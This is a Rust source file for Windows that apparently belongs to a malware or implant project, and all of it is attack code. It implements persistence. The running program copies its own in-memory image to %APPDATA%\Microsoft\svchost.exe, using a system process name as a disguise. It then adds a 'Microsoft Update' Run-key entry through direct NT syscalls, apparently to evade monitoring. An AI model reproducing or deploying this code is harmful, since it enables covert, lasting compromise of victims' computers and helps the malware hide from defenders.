use std::env;
use std::fs;
use std::io::Write;
use std::path::Path;
use std::ptr;
use crate::syscalls::SYSCALLS;
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, TOKEN_USER, TOKEN_QUERY};
#[cfg(target_pointer_width = "64")]
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
#[cfg(target_pointer_width = "32")]
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_SIGNATURE;
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
use windows_sys::Win32::Security::{GetTokenInformation, ConvertSidToStringSidW};
use windows_sys::Win32::Foundation::{UNICODE_STRING, HANDLE, LocalFree, NTSTATUS};
use windows_sys::Win32::System::Kernel::OBJECT_ATTRIBUTES;
use std::ffi::{c_void, OsString, OsStr};
use std::os::windows::ffi::{OsStringExt, OsStrExt};
use std::iter::once;

#[cfg(target_pointer_width = "64")]
type IMAGE_NT_HEADERS = IMAGE_NT_HEADERS64;
#[cfg(target_pointer_width = "32")]
type IMAGE_NT_HEADERS = IMAGE_NT_HEADERS32;

fn get_image_size(base_address: *const u8) -> Option<usize> {
    unsafe {
        let dos_header = base_address as *const IMAGE_DOS_HEADER;
        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            return None;
        }

        let nt_headers_ptr = base_address.add((*dos_header).e_lfanew as usize);
        let nt_headers = nt_headers_ptr as *const IMAGE_NT_HEADERS;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            return None;
        }

        Some((*nt_headers).OptionalHeader.SizeOfImage as usize)
    }
}

fn get_user_sid_string() -> Result<String, std::io::Error> {
    let mut token_handle: HANDLE = 0;
    if unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle) } == 0 {
        return Err(std::io::Error::last_os_error());
    }

    let mut return_length: u32 = 0;
    unsafe { GetTokenInformation(token_handle, 1, ptr::null_mut(), 0, &mut return_length) };
    if return_length == 0 {
        return Err(std::io::Error::last_os_error());
    }

    let mut token_user_buffer: Vec<u8> = vec![0; return_length as usize];
    let token_user = token_user_buffer.as_mut_ptr() as *mut TOKEN_USER;

    if unsafe { GetTokenInformation(token_handle, 1, token_user as *mut _, return_length, &mut return_length) } == 0 {
        return Err(std::io::Error::last_os_error());
    }

    let sid = unsafe { (*token_user).User.Sid };
    let mut sid_string_ptr: *mut u16 = ptr::null_mut();
    if unsafe { ConvertSidToStringSidW(sid, &mut sid_string_ptr) } == 0 {
        return Err(std::io::Error::last_os_error());
    }

    let sid_string = unsafe {
        let len = (0..).take_while(|&i| *sid_string_ptr.offset(i) != 0).count();
        let slice = std::slice::from_raw_parts(sid_string_ptr, len);
        OsString::from_wide(slice).to_string_lossy().into_owned()
    };

    unsafe { LocalFree(sid_string_ptr as isize) };

    Ok(sid_string)
}

pub fn add_to_startup() -> Result<(), std::io::Error> {
    let appdata_path = env::var("APPDATA").map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
    let persist_dir = Path::new(&appdata_path).join("Microsoft");
    fs::create_dir_all(&persist_dir)?;
    let persist_path = persist_dir.join("svchost.exe");

    let base_address = unsafe { GetModuleHandleA(ptr::null()) } as *const u8;
    if base_address.is_null() {
        return Err(std::io::Error::last_os_error());
    }

    let image_size = get_image_size(base_address).ok_or_else(|| {
        std::io::Error::new(std::io::ErrorKind::InvalidData, "Failed to get image size")
    })?;

    let image_bytes = unsafe { std::slice::from_raw_parts(base_address, image_size) };

    let mut file = fs::File::create(&persist_path)?;
    file.write_all(image_bytes)?;

    let user_sid = get_user_sid_string()?;
    let key_path = format!(
        "\\Registry\\User\\{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        user_sid
    );
    let wide_key_path: Vec<u16> = OsStr::new(&key_path).encode_wide().chain(once(0)).collect();
    let mut key_path_unicode = UNICODE_STRING {
        Length: ((wide_key_path.len() - 1) * 2) as u16,
        MaximumLength: (wide_key_path.len() * 2) as u16,
        Buffer: wide_key_path.as_ptr() as *mut _,
    };

    let mut key_handle: HANDLE = 0;
    let mut object_attributes = OBJECT_ATTRIBUTES {
        Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: 0,
        ObjectName: &mut key_path_unicode,
        Attributes: 0x00000040,
        SecurityDescriptor: ptr::null_mut(),
        SecurityQualityOfService: ptr::null_mut(),
    };

    let mut disposition: u32 = 0;
    let status: NTSTATUS = unsafe {
        (SYSCALLS.NtCreateKey)(
            &mut key_handle,
            0x00020006,
            &mut object_attributes,
            0,
            ptr::null_mut(),
            0,
            &mut disposition,
        )
    };

    if status != 0 {
        return Err(std::io::Error::from_raw_os_error(status as i32));
    }

    let value_name = "Microsoft Update";
    let wide_value_name: Vec<u16> = OsStr::new(value_name).encode_wide().chain(once(0)).collect();
    let mut value_name_unicode = UNICODE_STRING {
        Length: ((wide_value_name.len() - 1) * 2) as u16,
        MaximumLength: (wide_value_name.len() * 2) as u16,
        Buffer: wide_value_name.as_ptr() as *mut _,
    };

    let wide_persist_path: Vec<u16> = persist_path.as_os_str().encode_wide().chain(once(0)).collect();

    let status = unsafe {
        (SYSCALLS.NtSetValueKey)(
            key_handle,
            &mut value_name_unicode,
            0,
            1,
            wide_persist_path.as_ptr() as *mut _,
            (wide_persist_path.len() * 2) as u32,
        )
    };

    if status != 0 {
        return Err(std::io::Error::from_raw_os_error(status as i32));
    }

    unsafe { (SYSCALLS.NtClose)(key_handle as *mut _) };

    Ok(())
}
